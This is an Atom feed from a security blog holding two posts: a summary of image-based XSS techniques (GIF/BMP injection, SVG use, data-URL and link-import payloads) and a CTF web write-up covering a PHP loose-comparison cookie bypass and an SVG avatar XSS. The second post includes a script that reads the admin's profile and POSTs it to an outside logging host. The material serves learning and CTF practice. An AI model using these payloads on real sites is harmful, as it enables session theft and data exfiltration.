<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mi1k7ea</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://Mi1k7ea.github.com/"/>
  <updated>2019-03-22T17:01:21.681Z</updated>
  <id>https://Mi1k7ea.github.com/</id>
  
  <author>
    <name>Mi1k7ea</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>图片XSS小结</title>
    <link href="https://Mi1k7ea.github.com/2019/03/22/%E5%9B%BE%E7%89%87XSS%E5%B0%8F%E7%BB%93/"/>
    <id>https://Mi1k7ea.github.com/2019/03/22/图片XSS小结/</id>
    <published>2019-03-22T14:52:04.000Z</published>
    <updated>2019-03-22T17:01:21.681Z</updated>
    
    <content type="html"><![CDATA[<p>最近做题遇到图片XSS的构造，这里就小结一下笔记吧。</p><h2 id="图片XSS"><a href="#图片XSS" class="headerlink" title="图片XSS"></a>图片XSS</h2><p>图片XSS，简单地说，就是将JavaScript代码尽量插入图片的无用区域，在不影响图片显示的情况下满足JS代码格式从而执行图片中的JS代码导致XSS。</p><p><strong>注意：只对IE有效，Chrome和Firefox无法触发。</strong></p><p>向gif文件中注入JavaScript的脚本：<a href="http://pastebin.com/6yUbfGX5" target="_blank" rel="noopener">http://pastebin.com/6yUbfGX5</a></p><p>向bmp文件中注入JavaScript的脚本：<a href="http://pastebin.com/04y7ee3u" target="_blank" rel="noopener">http://pastebin.com/04y7ee3u</a></p><p>gif图片插入payload：<code>python gif_injector.py -i flower.gif &quot;alert(&#39;Mi1k7ea&#39;);&quot;</code></p><p>bmp图片插入payload：<code>python bmpinjector.py -i pain.bmp &quot;alert(location);&quot;</code></p><p>写段页面代码加载该图片：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Image XSS Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"flower.gif_malw.gif"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"flower.gif_malw.gif"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是现在只剩gif可以执行XSS了，bmp不行：</p><p><img src="/2019/03/22/图片XSS小结/1.png" alt=""></p><h2 id="SVG-XSS"><a href="#SVG-XSS" class="headerlink" title="SVG XSS"></a>SVG XSS</h2><p>SVG是一种基于XML的图像文件格式。</p><h3 id="use元素"><a href="#use元素" class="headerlink" title="use元素"></a>use元素</h3><p>SVG中的use元素用于重用其他元素，主要用于联接defs和alike，而我们却用它来引用外部SVG文件中的元素。</p><p>元素通过其id被引用，在use标签的xlink:href属性中以’#’井字符开头，外部元素的引用同样如此。</p><p>示例如下。</p><p>pic.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">use</span> <span class="attr">xlink:href</span>=<span class="string">'exp.svg#m7'</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>exp.svg：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">id</span>=<span class="string">"m7"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">"javascript:alert('Mi1k7ea')"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">rect</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>.svg文件以svg标签开始，其id设置为m7，使用rect标签绘一个矩形。可以使用a环绕rect标签，这样会创建一个超链接。使用Javascript伪协议，可点击的超链接在点击后会执行Javascript。虽然SVG是经由use标签加载的，但是Javascript将会执行。有一点需要注意，它只能加载SVG文件，必须满足同源策略。</p><p>可以看到测试结果，在chrome和Firefox下点击黑框都能弹框：</p><p><img src="/2019/03/22/图片XSS小结/2.png" alt=""></p><h3 id="data-url-Base64"><a href="#data-url-Base64" class="headerlink" title="data:url+Base64"></a>data:url+Base64</h3><p>由于加载的外部SVG文件必须是同源的，这个特性看起来似乎无法作为有用的XSS攻击向量，但可以使用data:url协议来帮我们提升这个攻击向量。</p><p>首先，它允许我们从内部创建一个文件，要求正确的mime-type，在这里为image/svg+xml。mimie-type后是我们的攻击载荷或关键字base64。特别地，由于数据被base64编码，这有助于避免突破HTML结构的问题。</p><p>现在我们不必再依赖于服务器上的另一个文件了，改进一下pic.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">use</span> <span class="attr">xlink:href</span>=<span class="string">"data:image/svg+xml;base64,PHN2ZyBpZD0ibTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4NCjxhIHhsaW5rOmhyZWY9ImphdmFzY3JpcHQ6YWxlcnQoJ1hTUyEnKSI+PHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEwMCIgaGVpZ2h0PSIxMDAiIC8+PC9hPg0KPC9zdmc+#m7"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中base64加密的内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">id</span>=<span class="string">"m7"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">"javascript:alert('XSS!')"</span>&gt;</span><span class="tag">&lt;<span class="name">rect</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但只能在Firefox中测试可行，点击黑框后能够成功触发：</p><p><img src="/2019/03/22/图片XSS小结/3.png" alt=""></p><h3 id="无需点击——foreignObject元素"><a href="#无需点击——foreignObject元素" class="headerlink" title="无需点击——foreignObject元素"></a>无需点击——foreignObject元素</h3><p>如果在exp.svg中写script标签是不会被解析，但是SVG支持foreignObject元素。</p><p>通过阐述这个对象需要的扩展属性，有可能加载非SVG元素。这就意味着现在有可能是有iframe、embed及其他所有支持的HTML元素了，我们可以从一堆元素中进行选择执行Javascript，这里使用embed+JavascriptURL协议。</p><p>pic.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">use</span> <span class="attr">xlink:href</span>=<span class="string">"data:image/svg+xml;base64,PHN2ZyBpZD0ibTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHdpZHRoPSIxMDAiIGhlaWdodD0iMTAwIj4KPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo8Zm9yZWlnbk9iamVjdCB3aWR0aD0iMTAwIiBoZWlnaHQ9IjUwIiByZXF1aXJlZEV4dGVuc2lvbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPgoJPGVtYmVkIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiBzcmM9ImphdmFzY3JpcHQ6YWxlcnQoNjY2KSIgLz4KPC9mb3JlaWduT2JqZWN0Pgo8L3N2Zz4=#m7"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中base64加密内容为：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">id</span>=<span class="string">"m7"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foreignObject</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"50"</span> <span class="attr">requiredExtensions</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span> <span class="attr">src</span>=<span class="string">"javascript:alert(666)"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">foreignObject</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，在Firefox下，无需点击即可触发foreignObject标签内embed的JS伪协议执行JS代码从而弹框，同时没有弹框显示1说明了script标签不会被解析：</p><p><img src="/2019/03/22/图片XSS小结/4.png" alt=""></p><h2 id="link-XSS"><a href="#link-XSS" class="headerlink" title="link XSS"></a>link XSS</h2><p>前面利用use元素结合data:url只能在Firefox下生效，Chrome却不会触发。</p><p>这里可利用link来bypass Chrome。</p><p>示例pic.html如下，加密内容为<code>&lt;script&gt;alert(&quot;Hello&quot;);&lt;/script&gt;</code>：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"import"</span> <span class="attr">href</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4="</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在Chrome下成功执行（Firefox未成功）：</p><p><img src="/2019/03/22/图片XSS小结/5.png" alt=""></p><p>当然link的形式很多，href的地方本身就是可以插入js代码的，但是通过base64加密，可以bypass各种奇怪的过滤。</p><p>这里很多用到了data类型的url，可参考如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data:,&lt;文本数据&gt;  </span><br><span class="line">data:text/plain,&lt;文本数据&gt;  </span><br><span class="line">data:text/html,&lt;HTML代码&gt;  </span><br><span class="line">data:text/html;base64,&lt;base64编码的HTML代码&gt;  </span><br><span class="line">data:text/css,&lt;CSS代码&gt;  </span><br><span class="line">data:text/css;base64,&lt;base64编码的CSS代码&gt;  </span><br><span class="line">data:text/javascript,&lt;Javascript代码&gt;  </span><br><span class="line">data:text/javascript;base64,&lt;base64编码的Javascript代码&gt;  </span><br><span class="line">data:image/gif;base64,base64编码的gif图片数据  </span><br><span class="line">data:image/png;base64,base64编码的png图片数据  </span><br><span class="line">data:image/jpeg;base64,base64编码的jpeg图片数据  </span><br><span class="line">data:image/x-icon;base64,base64编码的icon图片数据</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.4hou.com/technology/3340.html" target="_blank" rel="noopener">浅析图片XSS中的哪些技术问题</a></p><p><a href="https://www.cnblogs.com/r00tgrok/p/SVG_Build_XSS_Vector_Bypass_Firefox_And_Chrome.html" target="_blank" rel="noopener">用SVG绕过浏览器XSS审计</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近做题遇到图片XSS的构造，这里就小结一下笔记吧。&lt;/p&gt;
&lt;h2 id=&quot;图片XSS&quot;&gt;&lt;a href=&quot;#图片XSS&quot; class=&quot;headerlink&quot; title=&quot;图片XSS&quot;&gt;&lt;/a&gt;图片XSS&lt;/h2&gt;&lt;p&gt;图片XSS，简单地说，就是将JavaScript
      
    
    </summary>
    
      <category term="Web安全基础" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="XSS" scheme="https://Mi1k7ea.github.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Teaser CONFidence CTF Web writeup</title>
    <link href="https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/"/>
    <id>https://Mi1k7ea.github.com/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/</id>
    <published>2019-03-21T11:58:22.000Z</published>
    <updated>2019-03-22T14:44:53.821Z</updated>
    
    <content type="html"><![CDATA[<p>这次Web题只做了前两道，最后一道GO的题目不会就没做了。</p><h2 id="My-admin-panel"><a href="#My-admin-panel" class="headerlink" title="My admin panel"></a>My admin panel</h2><p>题目地址：<a href="http://gameserver.zajebistyc.tf/" target="_blank" rel="noopener">http://gameserver.zajebistyc.tf/</a></p><p>题目描述：I think I’ve found something interesting, but I’m not really a PHP expert. Do you think it’s exploitable?</p><p>访问该页面，是个登录界面，可以下载客户端包：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/1.png" alt=""></p><p>下载该包下来，解压打开看，发现全是C/C++代码，和本题提示的PHP无关，因此点一个不在这。</p><p>尝试随便输入登录，发现无论输入啥都是返回Done界面：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/2.png" alt=""></p><p>这样的话也没办法进行SQL注入和盲注了，因为无论输入什么内容返回内容都一样。</p><p>那就尝试用工具扫下Web站点下隐藏的页面，果不其然：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/3.png" alt=""></p><p>一个个访问，login.php返回”Not authenticated.”，其他文件无显示，访问admin目录，存在一个login.php.bak备份文件：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/4.png" alt=""></p><p>下载下来，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../func.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../config.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!$_COOKIE[<span class="string">'otadmin'</span>]) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"Not authenticated.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^&#123;"hash": [0-9A-Z\"]+&#125;$/'</span>, $_COOKIE[<span class="string">'otadmin'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$session_data = json_decode($_COOKIE[<span class="string">'otadmin'</span>], <span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($session_data === <span class="keyword">NULL</span>) &#123; <span class="keyword">echo</span> <span class="string">"COOKIE TAMPERING xD IM A SECURITY EXPERT\n"</span>; <span class="keyword">exit</span>(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($session_data[<span class="string">'hash'</span>] != strtoupper(MD5($cfg_pass))) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"I CAN EVEN GIVE YOU A HINT XD \n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; i &lt; strlen(MD5(<span class="string">'xDdddddd'</span>)); i++) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(ord(MD5($cfg_pass)[$i]) &amp; <span class="number">0xC0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">display_admin();</span><br></pre></td></tr></table></figure><p>分析一下，先判断cookie字段是否存在otadmin属性；然后正则判断otadmin是否满足指定json格式的内容；提取出hash键值和$cfg_pass变量的MD5值进行比较，当不相等时输出一段经过运算后的提示信息。</p><p>注意，<code>if ($session_data[&#39;hash&#39;] != strtoupper(MD5($cfg_pass))) {</code>这里用的比较符是!=，按照习惯会想到是PHP弱类型。</p><p>随便填otadmin的内容发过去/admin/login.php看看，注意cookie值的构造要满足前面正则的匹配：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/5.png" alt=""></p><p>这里返回了一串经过运算处理后的内容：0006464640640064000646464640006400640640646400</p><p>分析一下，只有0/6/4这几个数字。将运算的那段代码扣下来本地运行一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cfg_pass=<span class="string">"Hello666"</span>;</span><br><span class="line"><span class="keyword">echo</span> MD5($cfg_pass);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen(MD5(<span class="string">'xDdddddd'</span>)); $i++) &#123;</span><br><span class="line"><span class="comment">// echo(ord(MD5($cfg_pass)[$i]) &amp; 0xC0);</span></span><br><span class="line"><span class="keyword">echo</span> MD5($cfg_pass)[$i];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> ord(MD5($cfg_pass)[$i]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span>(ord(MD5($cfg_pass)[$i]) &amp; <span class="number">0xC0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;-------------&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>随便给$cfg_pass变量赋值，然后运行观察，MD5值没啥好说的，到for循环后，先输出MD5的每一位，然后对其调用ord()函数取该字符对于的ASCII码，最后再和0xC0进行&amp;与运算：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/6.png" alt=""></p><p>可以看到，最后&amp;与运算的结果不是0就是64，那就写个小脚本确认一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">127</span>):</span><br><span class="line">print(str(x)+<span class="string">":"</span>+str(x&amp;<span class="number">0xC0</span>))</span><br></pre></td></tr></table></figure><p>运行这段代码会发现，1-63与运算后为0，64以后与运算后为64。我们知道，数字0-9的ASCII码为48-57，即数字与运算后结果均为0，而字母A-Za-z的ASCII码都大于64，即字母与运算后结果均为64。</p><p>那么就很明确了，再看看页面返回的值：0006464640640064000646464640006400640640646400。</p><p>前面3位是0，后面接着是字母结合数字的混合体。</p><p>这时就可以祭出弱类型了，我们知道<code>123==&quot;123aivmfsjoo90i1jj90i0i031&quot;</code>是恒成立的，因此剩下的问题就变成了只需要暴破该MD5的前3为数字即可绕过得到flag，最终爆破出的payload为<code>Cookie: otadmin={&quot;hash&quot;: 389}</code>：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/7.png" alt=""></p><h2 id="Web-50"><a href="#Web-50" class="headerlink" title="Web 50"></a>Web 50</h2><p>题目地址：<a href="http://web50.zajebistyc.tf/login?next=%2F" target="_blank" rel="noopener">http://web50.zajebistyc.tf/login?next=%2F</a></p><p>题目描述：idk what this site does, but you can put some secret, shoe size and report it to the admin…</p><p>访问页面，是个登录界面：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/8.png" alt=""></p><p>随便输入用户名和密码，进入了另一个界面：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/9.png" alt=""></p><p>其中有两个链接，Profile为当前登录用户的信息设置界面，包括设置一些字段内容和上传头像功能：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/10.png" alt=""></p><p>另一个Report a bug为向管理员报告bug链接的地方，由此推测是一道通过XSS窃取管理员cookie获取flag的题目：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/11.png" alt=""></p><p>回到用户信息设置界面，尝试将URL栏的本用户alan改为admin，可以访问，但是没有显示用户Avatar头像和Secret字段，猜测flag可能藏在Secret字段中：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/12.png" alt=""></p><p>回到本用户设置界面随意设置，发现图片只能上传100*100格式的，且对文件的Content-Type、后缀名以及文件内容前面部分进行了校验，一开始想上传一句话木马的，发现没有文件包含结合便无法利用。</p><p>后面想了一下应该就是注入XSS然后将用户链接发过去让admin访问。</p><p>写段测试代码，注意要设置宽度和高度均为100：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">baseProfile</span>=<span class="string">"full"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">polygon</span> <span class="attr">id</span>=<span class="string">"triangle"</span> <span class="attr">points</span>=<span class="string">"0,0 0,50 50,0"</span> <span class="attr">fill</span>=<span class="string">"#009900"</span> <span class="attr">stroke</span>=<span class="string">"#004400"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">alert("Mi1k7ea");</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>本地访问没问题：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/13.png" alt=""></p><p>上传到Avatar：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/14.png" alt=""></p><p>确认一下，访问该Avatar所在地址，没有问题，成功弹框：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/15.png" alt=""></p><p>到report界面上报，说admin会查看，确认了就是通过XSS获取admin的敏感信息来获得flag：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/16.png" alt=""></p><p>后面就修改一下JS代码，让admin访问自己的profile界面，因为其本身拥有对Secret字段的访问权，然后再通过JS实现XMLHttpRequest以POST形式发送过来，这样就可以得到它的Secret字段内容了：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" standalone="no"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">baseProfile</span>=<span class="string">"full"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100"</span> <span class="attr">height</span>=<span class="string">"100"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">polygon</span> <span class="attr">id</span>=<span class="string">"triangle"</span> <span class="attr">points</span>=<span class="string">"0,0 0,50 50,0"</span> <span class="attr">fill</span>=<span class="string">"#009900"</span> <span class="attr">stroke</span>=<span class="string">"#004400"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var xhr = new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">xhr.onreadystatechange = function() &#123;</span></span><br><span class="line"><span class="undefined">if (xhr.readyState === 4) &#123;</span></span><br><span class="line"><span class="undefined">var xhr2 = new XMLHttpRequest();</span></span><br><span class="line"><span class="undefined">xhr2.open("POST", "http://XXXX.ceye.io/");</span></span><br><span class="line"><span class="undefined">xhr2.send(xhr.responseText);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">&#125;   </span></span><br><span class="line"><span class="undefined">xhr.open("GET", "http://web50.zajebistyc.tf/profile/admin");</span></span><br><span class="line"><span class="undefined">xhr.withCredentials = true;</span></span><br><span class="line"><span class="undefined">xhr.send();</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>再次上传svg图像，将该Avatar地址上报给admin，然后到ceye中可收到flag：</p><p><img src="/2019/03/21/Teaser-CONFidence-CTF-Web-writeup/17.png" alt=""></p>]]></content>
    
